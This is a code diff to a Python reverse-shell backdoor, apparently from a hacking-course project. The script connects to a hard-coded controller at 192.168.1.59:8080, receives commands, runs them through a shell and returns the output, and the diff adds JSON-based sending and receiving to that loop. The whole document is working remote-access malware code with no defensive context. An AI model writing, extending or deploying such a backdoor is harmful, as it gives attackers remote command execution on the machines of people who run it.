@@ -1,3 +1,4 @@
+import json
 import socket
 import subprocess
 
@@ -10,11 +11,26 @@ class connectionSocket:
     def command_interaction(self,command):
          return subprocess.check_output(command, shell=True)
 
+    def json_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+
+    def json_recv(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data +self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+
     def listening(self):
         while True:
-            command = self.connection.recv(1024)
+            command = self.json_recv()
             command_output = self.command_interaction(command)
-            self.connection.send(command_output)
+            self.json_send(command_output)
         self.connection.close()
 
 socket_obj = connectionSocket("192.168.1.59",8080)
